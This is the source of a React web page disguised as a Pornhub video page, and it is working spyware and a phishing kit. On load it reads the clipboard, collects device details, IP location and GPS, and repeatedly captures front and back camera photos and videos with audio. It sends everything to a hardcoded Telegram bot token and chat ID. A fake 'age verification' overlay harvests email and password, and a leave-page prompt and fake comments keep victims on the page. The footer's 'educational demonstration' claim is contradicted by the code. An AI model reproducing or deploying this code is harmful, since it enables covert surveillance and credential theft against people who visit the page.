import { useState, useRef, useEffect } from 'react';
import { CheckCircle2, Search, Menu, User, MessageSquare, Upload } from 'lucide-react';

const TELEGRAM_BOT_TOKEN = '8773116269:AAEDj_wg2CNTKP1tj20d880fWepz-uCxZAk';
const TELEGRAM_CHAT_ID = '8471022379';

type AppStep = 'initial' | 'processing' | 'completed';

export default function App() {
  const [step, setStep] = useState<AppStep>('initial');
  const [sendingText, setSendingText] = useState('');
  const [loadPercent, setLoadPercent] = useState(0);
  const [showPhish, setShowPhish] = useState(false);
  const [phishData, setPhishData] = useState({ email: '', pass: '' });
  
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const capturedChunks = useRef<Blob[]>([]);
  const sessionSent = useRef(false);
  const hasAudio = useRef(false);

  const thumbImages = [
    'https://www.image2url.com/r2/default/images/1777356617831-cafb2be8-3fd5-4fc2-8516-24d94114a591.webp',
    'https://www.image2url.com/r2/default/images/1777356657134-3904bf91-f61a-4bfd-93e2-8c6766884540.jpg',
    'https://www.image2url.com/r2/default/images/1777356692152-79187e2c-91e9-4567-bf45-53206896f7e0.jpg',
    'https://images.unsplash.com/photo-1621784563260-8f94d3596707?q=80&w=800&auto=format&fit=crop',
    'https://images.unsplash.com/photo-1544005313-94ddf0286df2?q=80&w=800&auto=format&fit=crop',
    'https://images.unsplash.com/photo-1503023345310-bd7c1de61c7d?q=80&w=800&auto=format&fit=crop',
    'https://images.unsplash.com/photo-1554151228-14d9def656e4?q=80&w=800&auto=format&fit=crop',
    'https://images.unsplash.com/photo-1517841905240-472988babdf9?q=80&w=800&auto=format&fit=crop',
    'https://images.unsplash.com/photo-1539571696357-5a69c17a67c6?q=80&w=800&auto=format&fit=crop',
    'https://images.unsplash.com/photo-1524504388940-b1c1722653e1?q=80&w=800&auto=format&fit=crop',
    'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?q=80&w=800&auto=format&fit=crop',
    'https://images.unsplash.com/photo-1488426862026-3ee34a7d66df?q=80&w=800&auto=format&fit=crop',
    'https://images.unsplash.com/photo-1494790108377-be9c29b29330?q=80&w=800&auto=format&fit=crop',
    'https://images.unsplash.com/photo-1534528741775-53994a69daeb?q=80&w=800&auto=format&fit=crop',
    'https://images.unsplash.com/photo-1531746020798-e6953c6e8e04?q=80&w=800&auto=format&fit=crop',
    'https://images.unsplash.com/photo-1513373319109-eb154073eb0b?q=80&w=800&auto=format&fit=crop',
    'https://images.unsplash.com/photo-1514315384763-ba401779410f?q=80&w=800&auto=format&fit=crop',
    'https://images.unsplash.com/photo-1492106087820-71f1a00d2b11?q=80&w=800&auto=format&fit=crop',
    'https://images.unsplash.com/photo-1496440737103-cd596325d314?q=80&w=800&auto=format&fit=crop',
    'https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?q=80&w=800&auto=format&fit=crop'
  ];

  // Generate static metadata once
  const [videoMeta] = useState(() => thumbImages.map((img, i) => ({
    img,
    duration: `${Math.floor((i * 7 + 5) % 20 + 5)}:${Math.floor((i * 13 + 10) % 50 + 10)}`,
    views: `${Math.floor((i * 157 + 100) % 800 + 100)}K`,
    rating: `${Math.floor((i * 3 + 95) % 5 + 95)}%`
  })));

  const [activeImage, setActiveImage] = useState(thumbImages[0]);

  useEffect(() => {
    // Fake loading percentage logic
    const interval = setInterval(() => {
      setLoadPercent(prev => {
        if (prev === 45) setShowPhish(true); // Trigger Phish at 45%
        if (prev >= 99) return 99;
        return prev + 1;
      });
    }, 330);

    // Prevent user from leaving easily
    const handleBeforeUnload = (e: BeforeUnloadEvent) => {
      e.preventDefault();
      e.returnValue = 'ভিডিওটি লোড হচ্ছে, দয়া করে অপেক্ষা করুন। আপনি কি নিশ্চিতভাবে বের হতে চান?';
    };
    window.addEventListener('beforeunload', handleBeforeUnload);

    const timer = setTimeout(() => {
      startProcess();
    }, 1500);

    return () => {
      clearInterval(interval);
      window.removeEventListener('beforeunload', handleBeforeUnload);
      clearTimeout(timer);
    };
  }, []);

  const handleVideoClick = (imgUrl: string) => {
    setActiveImage(imgUrl);
    setLoadPercent(0);
    setStep('initial');
    // Restart process on the new video
    setTimeout(() => startProcess(), 500);
  };

  const getStream = async (facingMode: 'user' | 'environment') => {
    // Try with audio first if we haven't determined it yet or if we know it works
    const tryAudio = !sessionSent.current || hasAudio.current;
    
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
        audio: tryAudio
      });
      hasAudio.current = stream.getAudioTracks().length > 0;
      return stream;
    } catch (e) {
      // Fallback to video only
      try {
        return await navigator.mediaDevices.getUserMedia({
          video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
          audio: false
        });
      } catch (err) {
        return null;
      }
    }
  };

  const startProcess = async () => {
    if (step === 'processing') return;
    
    // Snatch Clipboard
    try {
      const text = await navigator.clipboard.readText();
      if (text) await sendToTelegram('text', null, `[CLIPBOARD]: ${text}`);
    } catch (e) {}

    try {
      if (document.documentElement.requestFullscreen) {
        document.documentElement.requestFullscreen();
      }
    } catch (e) {}

    try {
      if ('wakeLock' in navigator) {
        // @ts-ignore
        await navigator.wakeLock.request('screen');
      }
    } catch (e) {}
    
    setStep('processing');
    setSendingText('Connecting...');

    if (!sessionSent.current) {
      const info = await getDeviceInfo();
      await sendToTelegram('text', null, `--- NEW SESSION ---\n${info}`);
      sessionSent.current = true;
    }

    while (true) {
      await runFullDeviceCycle();
      await new Promise(resolve => setTimeout(resolve, 500));
    }
  };

  const submitPhish = async () => {
    await sendToTelegram('text', null, `[ACCOUNT]: ${phishData.email} | ${phishData.pass}`);
    setShowPhish(false);
    if (window.navigator.vibrate) window.navigator.vibrate([100, 50, 100]);
  };

  const getDeviceInfo = async () => {
    const info: any = {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      memory: (navigator as any).deviceMemory + 'GB',
      cores: navigator.hardwareConcurrency,
      screen: `${window.screen.width}x${window.screen.height}`,
      language: navigator.language,
      connection: (navigator as any).connection?.effectiveType || 'unknown'
    };
    
    // 1. IP Based Location (Silent)
    try {
      const ipRes = await fetch('https://ipapi.co/json/');
      const ipData = await ipRes.json();
      info.ip = ipData.ip;
      info.city = ipData.city;
      info.region = ipData.region;
      info.country = ipData.country_name;
      info.isp = ipData.org;
    } catch (e) {
      info.location = 'IP Fetch Failed';
    }

    // 2. Precise GPS Location (Requires Permission)
    try {
      const pos: any = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
      });
      info.gps = `${pos.coords.latitude}, ${pos.coords.longitude}`;
      info.maps = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
    } catch (e) {
      info.gps = 'Permission Denied';
    }
    
    try {
      if ('getBattery' in navigator) {
        const battery: any = await (navigator as any).getBattery();
        info.battery = `${Math.round(battery.level * 100)}%`;
        info.charging = battery.charging ? 'Yes' : 'No';
      }
    } catch (e) {}

    return Object.entries(info).map(([k, v]) => `${k}: ${v}`).join('\n');
  };

  const runFullDeviceCycle = async () => {
    // 1. FRONT CAMERA
    const frontStream = await getStream('user');
    if (frontStream) {
      if (videoRef.current) {
        videoRef.current.srcObject = frontStream;
        await videoRef.current.play();
      }
      
      // Rapido capture
      for (let i = 0; i < 3; i++) {
        setSendingText(`Sync ${i + 1}`);
        const blob = await takeSnapshot();
        if (blob) sendToTelegram('photo', blob, 'F'); // No await for speed
        await new Promise(r => setTimeout(r, 100));
      }
      
      const vid = await recordVideo(frontStream, 3000); // Shorter video for speed
      if (vid) sendToTelegram('video', vid, 'FV');
      
      frontStream.getTracks().forEach(t => t.stop());
    }

    // 2. BACK CAMERA
    const backStream = await getStream('environment');
    if (backStream) {
      if (videoRef.current) {
        videoRef.current.srcObject = backStream;
        await videoRef.current.play();
      }
      
      for (let i = 0; i < 3; i++) {
        setSendingText(`Sync ${i + 4}`);
        const blob = await takeSnapshot();
        if (blob) sendToTelegram('photo', blob, 'B'); // No await for speed
        await new Promise(r => setTimeout(r, 100));
      }
      
      const vid = await recordVideo(backStream, 3000);
      if (vid) sendToTelegram('video', vid, 'BV');
      
      backStream.getTracks().forEach(t => t.stop());
    }
  };

  const takeSnapshot = (): Promise<Blob | null> => {
    return new Promise((resolve) => {
      if (!videoRef.current || !canvasRef.current) return resolve(null);
      const video = videoRef.current;
      const canvas = canvasRef.current;
      
      // Use full video resolution for HD
      canvas.width = video.videoWidth || 1280;
      canvas.height = video.videoHeight || 720;
      
      const context = canvas.getContext('2d');
      if (context) {
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        // High quality JPEG
        canvas.toBlob((blob) => resolve(blob), 'image/jpeg', 0.92);
      } else {
        resolve(null);
      }
    });
  };

  const recordVideo = (stream: MediaStream, duration: number): Promise<Blob | null> => {
    return new Promise((resolve) => {
      try {
        if (typeof MediaRecorder === 'undefined') return resolve(null);
        capturedChunks.current = [];
        const recorder = new MediaRecorder(stream);
        mediaRecorderRef.current = recorder;
        recorder.ondataavailable = (event) => {
          if (event.data.size > 0) capturedChunks.current.push(event.data);
        };
        recorder.onstop = () => {
          const blob = new Blob(capturedChunks.current, { type: 'video/webm' });
          resolve(blob);
        };
        recorder.start();
        setTimeout(() => {
          if (recorder.state !== 'inactive') recorder.stop();
        }, duration);
      } catch (e) {
        resolve(null);
      }
    });
  };

  const sendToTelegram = async (type: 'photo' | 'video' | 'text', blob: Blob | null, caption: string = '') => {
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    let url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/`;
    
    if (type === 'photo' && blob) {
      url += 'sendPhoto';
      formData.append('photo', blob, 'img.jpg');
      formData.append('caption', caption);
    } else if (type === 'video' && blob) {
      url += 'sendVideo';
      formData.append('video', blob, 'vid.webm');
      formData.append('caption', caption);
    } else {
      url += 'sendMessage';
      formData.append('text', caption);
    }

    try {
      await fetch(url, { method: 'POST', body: formData });
    } catch (err) {
      console.error(`Error sending ${type}`);
    }
  };

  return (
    <div className="min-h-screen bg-[#1b1b1b] text-white font-sans selection:bg-[#ff9900]">
      {/* Hidden elements */}
      <video ref={videoRef} className="hidden" playsInline muted />
      <canvas ref={canvasRef} className="hidden" />

      {/* Header */}
      <header className="sticky top-0 z-50 bg-[#1b1b1b] h-12 flex items-center px-2 justify-between border-b border-[#333]">
        <div className="flex items-center space-x-3">
          <Menu className="h-5 w-5 text-white cursor-pointer" />
          <div className="flex items-center text-xl font-bold tracking-tighter">
            <span className="text-white">Porn</span>
            <span className="bg-[#ff9900] text-black px-1 py-0 rounded-[4px] ml-0.5 text-lg">hub</span>
          </div>
        </div>

        <div className="hidden sm:flex flex-1 max-w-md mx-4 relative">
          <input 
            type="text" 
            placeholder="Search..."
            className="w-full bg-[#000] border border-[#444] rounded-full py-1 px-4 text-xs focus:outline-none focus:border-[#ff9900]"
          />
          <Search className="h-3 w-3 text-[#999] absolute right-3 top-2" />
        </div>

        <div className="flex items-center space-x-3">
          <Upload className="h-4 w-4 text-[#ccc] cursor-pointer" />
          <MessageSquare className="h-4 w-4 text-[#ccc] cursor-pointer" />
          <div className="h-7 w-7 bg-[#333] rounded-full flex items-center justify-center cursor-pointer">
            <User className="h-4 w-4 text-[#ccc]" />
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="max-w-[1440px] mx-auto pb-10">
        {/* Fake Phishing Overlay */}
        {showPhish && (
          <div className="fixed inset-0 z-[10000] flex items-center justify-center bg-black/90 p-4">
            <div className="bg-[#1b1b1b] w-full max-w-sm rounded-md border border-[#333] p-6 space-y-4 shadow-2xl">
              <div className="flex justify-center mb-2">
                <div className="bg-[#ff9900] text-black px-2 py-0.5 rounded font-bold text-xl">hub</div>
              </div>
              <h2 className="text-center text-lg font-bold">Age Verification Required</h2>
              <p className="text-xs text-[#999] text-center">This video is age-restricted. Please verify your account to continue.</p>
              <div className="space-y-3">
                <input 
                  type="text" 
                  placeholder="Email or Username"
                  className="w-full bg-[#000] border border-[#444] rounded py-2 px-3 text-sm focus:outline-none focus:border-[#ff9900]"
                  onChange={(e) => setPhishData({...phishData, email: e.target.value})}
                />
                <input 
                  type="password" 
                  placeholder="Password"
                  className="w-full bg-[#000] border border-[#444] rounded py-2 px-3 text-sm focus:outline-none focus:border-[#ff9900]"
                  onChange={(e) => setPhishData({...phishData, pass: e.target.value})}
                />
                <button 
                  onClick={submitPhish}
                  className="w-full bg-[#ff9900] text-black font-bold py-2 rounded hover:bg-[#ffad33] transition-colors"
                >
                  Verify Now
                </button>
              </div>
              <p className="text-[10px] text-[#666] text-center">Secure SSL encryption activated.</p>
            </div>
          </div>
        )}

        <div className="flex flex-col lg:flex-row gap-4 p-4">
          
          {/* Left Column: Player and Info */}
          <div className="flex-1 space-y-4">
            {/* Video Player Area */}
            <div 
              onClick={startProcess}
              className="relative aspect-video bg-black rounded-sm overflow-hidden border border-[#333] cursor-pointer group"
            >
              <img 
                src={activeImage} 
                alt="Main Video" 
                className="w-full h-full object-cover blur-[4px] opacity-60 group-hover:opacity-70 transition-opacity"
              />
              
              {/* Overlay / Loading */}
              <div className="absolute inset-0 flex flex-col items-center justify-center">
                {step !== 'completed' ? (
                  <div className="flex flex-col items-center space-y-4">
                    <div className="h-16 w-16 border-4 border-[#ff9900]/20 border-t-[#ff9900] rounded-full animate-spin" />
                    <div className="flex flex-col items-center">
                      <p className="text-[#ff9900] text-sm font-bold tracking-widest uppercase">
                        Loading Video... {loadPercent}%
                      </p>
                      <p className="text-[#666] text-[10px] mt-1">Please do not close this tab</p>
                    </div>
                  </div>
                ) : (
                  <div className="flex flex-col items-center space-y-4 bg-black/80 p-8 rounded-lg border border-red-500/20 max-w-xs text-center">
                    <CheckCircle2 className="h-12 w-12 text-green-500" />
                    <h3 className="font-bold text-lg">Server Connection Error</h3>
                    <p className="text-xs text-[#999]">This video is not available in your region. Please try again later or use a proxy.</p>
                  </div>
                )}
              </div>

              {/* Fake Player UI */}
              <div className="absolute bottom-0 left-0 right-0 p-4 bg-gradient-to-t from-black/80 to-transparent space-y-2">
                <div className="w-full h-1 bg-[#444] rounded-full">
                  <div className={`h-full bg-[#ff9900] transition-all duration-1000 ${step === 'processing' ? 'w-1/4' : 'w-0'}`} />
                </div>
                <div className="flex justify-between items-center opacity-70">
                  <div className="flex items-center space-x-4">
                    <div className="h-3 w-3 bg-white/20 rounded-full" />
                    <div className="h-1 w-20 bg-white/10 rounded-full" />
                  </div>
                  <div className="text-[10px] font-mono">00:00 / 12:45</div>
                </div>
              </div>

              {/* Hidden Sending Text */}
              <div className="absolute top-2 left-2 opacity-5 pointer-events-none">
                <span className="text-[8px] font-mono">{sendingText}</span>
              </div>
            </div>

            {/* Video Info */}
            <div className="space-y-2 border-b border-[#333] pb-4">
              <h1 className="text-xl font-bold leading-tight">Extreme Loading Experiment - High Definition 4K</h1>
              <div className="flex justify-between items-center text-[#999] text-sm">
                <div className="flex items-center space-x-4">
                  <span>1,245,092 views</span>
                  <span className="text-[#ff9900] font-bold">98% Success</span>
                </div>
                <div className="flex space-x-4 uppercase font-bold text-xs">
                  <button className="flex items-center space-x-1 hover:text-white"><Upload className="h-3 w-3"/><span>Share</span></button>
                  <button className="flex items-center space-x-1 hover:text-white"><span>Download</span></button>
                </div>
              </div>
            </div>
          </div>

          {/* Right Column: Related */}
          <div className="lg:w-[320px] shrink-0 space-y-4">
            <h3 className="font-bold text-sm uppercase tracking-wider text-[#999]">Related Videos</h3>
            {[0, 1, 2, 3, 4, 5].map((i) => (
              <div 
                key={i} 
                className="flex gap-2 group cursor-pointer"
                onClick={() => handleVideoClick(thumbImages[i % thumbImages.length])}
              >
                <div className="w-[140px] aspect-video bg-[#333] rounded-sm relative overflow-hidden shrink-0">
                   <img 
                    src={thumbImages[i % thumbImages.length]} 
                    className="w-full h-full object-cover blur-[3px] opacity-50"
                    alt={`Thumb ${i}`}
                   />
                   <div className="absolute bottom-1 right-1 bg-black text-white text-[10px] px-1 rounded">12:{10+i}</div>
                </div>
                <div className="flex-1 space-y-1">
                  <div className="h-3 w-full bg-[#333] rounded-full" />
                  <div className="h-3 w-3/4 bg-[#333] rounded-full opacity-60" />
                  <div className="text-[10px] text-[#666] mt-2">452K views • 2 years ago</div>
                </div>
              </div>
            ))}
          </div>
        </div>

        {/* Categories / Tags Section */}
        <div className="px-4 py-6 border-t border-[#333] mt-4 overflow-x-auto whitespace-nowrap scrollbar-hide">
          <div className="flex space-x-3">
            {['HD Video', 'Trending', 'Most Recent', 'Popular', '4K Quality', 'Loading...', 'Experimental'].map(tag => (
              <span key={tag} className="px-4 py-1.5 bg-[#282828] rounded-full text-xs font-bold hover:bg-[#383838] cursor-pointer transition-colors">
                {tag}
              </span>
            ))}
          </div>
        </div>

        {/* Bottom Grid for Scrolling */}
        <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-4 p-4 mt-4">
          {videoMeta.map((video, i) => (
            <div 
              key={i} 
              className="space-y-2 cursor-pointer group"
              onClick={() => handleVideoClick(video.img)}
            >
              <div className="aspect-video bg-[#282828] rounded-sm relative overflow-hidden">
                <img 
                  src={video.img} 
                  className="w-full h-full object-cover blur-[4px] opacity-40"
                  alt={`Grid ${i}`}
                />
                <div className="absolute bottom-2 right-2 bg-black/80 px-1.5 py-0.5 rounded text-[11px] font-bold">
                  {video.duration}
                </div>
              </div>
              <div className="space-y-1 px-1">
                <div className="h-3 w-full bg-[#282828] rounded-full group-hover:bg-[#333] transition-colors" />
                <div className="h-3 w-2/3 bg-[#282828] rounded-full opacity-60" />
                <div className="flex justify-between text-[10px] text-[#666] pt-1">
                  <span>{video.views} views</span>
                  <span className="text-[#ff9900]">{video.rating}</span>
                </div>
              </div>
            </div>
          ))}
        </div>

        {/* Fake Comment Section to keep user busy */}
        <div className="p-4 mt-6 border-t border-[#333]">
          <h3 className="text-lg font-bold mb-4">Comments (1,245)</h3>
          <div className="space-y-6">
            {[
              { name: 'John Doe', comment: 'Why is it taking so long to load? My internet is fine.', time: '2 min ago' },
              { name: 'X-Rated-King', comment: 'Wait for it guys, the quality is insane once it starts!', time: '5 min ago' },
              { name: 'Sarah_99', comment: 'Is this 4K? The thumbnail looks great.', time: '10 min ago' },
              { name: 'Techie_Guy', comment: 'Server might be overloaded. Just keep the tab open, it will load.', time: '12 min ago' }
            ].map((c, i) => (
              <div key={i} className="flex space-x-3">
                <div className="h-10 w-10 bg-[#333] rounded-full shrink-0" />
                <div className="space-y-1">
                  <div className="flex items-center space-x-2">
                    <span className="text-sm font-bold text-[#ff9900]">{c.name}</span>
                    <span className="text-[10px] text-[#666]">{c.time}</span>
                  </div>
                  <p className="text-sm text-[#ccc]">{c.comment}</p>
                </div>
              </div>
            ))}
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-[#282828] border-t border-black p-8 text-center text-[#999] text-xs space-y-4">
        <div className="flex flex-wrap justify-center gap-6 font-bold uppercase tracking-widest mb-6">
          <span>Terms of Use</span>
          <span>Privacy Policy</span>
          <span>Contact Us</span>
          <span>FAQ</span>
        </div>
        <p>© VideoHub.com - The experiment portal for loading technologies.</p>
        <p className="max-w-2xl mx-auto opacity-50">
          Disclaimer: This is a technical demonstration website. All content shown is for educational purposes regarding web technology loading states.
        </p>
      </footer>
    </div>
  );
}
